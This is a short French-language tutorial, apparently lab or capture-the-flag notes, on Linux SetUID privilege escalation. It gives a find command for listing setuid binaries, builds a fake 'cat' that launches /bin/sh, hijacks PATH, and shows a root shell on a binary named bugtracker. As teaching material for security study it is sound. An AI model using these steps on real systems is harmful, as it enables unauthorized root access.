# SetUID Privilege escalation

[Lien d'explication du mécanisme d'élévation de privilèges](https://blog.creekorful.org/2020/09/setuid-privilege-escalation/)

SetUID = Set Owner User ID

Il s'agit d'un bit positionné sur un fichier qui permet à tout processus de lancer ce fichier comme si il s'agissait du propriétaire du fichier.

Par exemple, si root est propriétaire du fichier toto avec un setuid positionné, robert pourra lancer le fichier toto en tant que root sans faire partie des sudoers.

Le mécanisme d'élévation de privilèges est le suivant :

* Identifier si un binaire "maison" utilise le SetUID (les binaires par défaut Linux ne sont en général pas vulnérables)

Commande pour énumérer tous les fichiers avec un setuid :

```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

-rwsr-xr-x 1 root root 16728 Sep  1 19:06 /usr/bin/bugtracker
```

* Exécuter ce binaire et voir s'il fait appel à d'autres binaires sans préciser l'arborescence complète : par exemple, `cat` au lieu de `/usr/bin/cat`
* Créer un binaire malveillant qui comporte uniquement un shell

```bash
mkdir /tmp/foo
echo /bin/sh > /tmp/foo/cat
chmod 755 /tmp/foo/cat
```

* Ecraser la variable $PATH pour que le binaire soit appelé en priorité dans notre répertoire malveillant

```bash
PATH=/tmp/foo:$PATH /usr/bin/bugtracker
```

* Utiliser le shell en tant que root

```bash
# id                                                                                                                                                                                                                                                                          
uid=0(root) gid=1000(robert) groups=1000(robert),1001(bugtracker) 
```
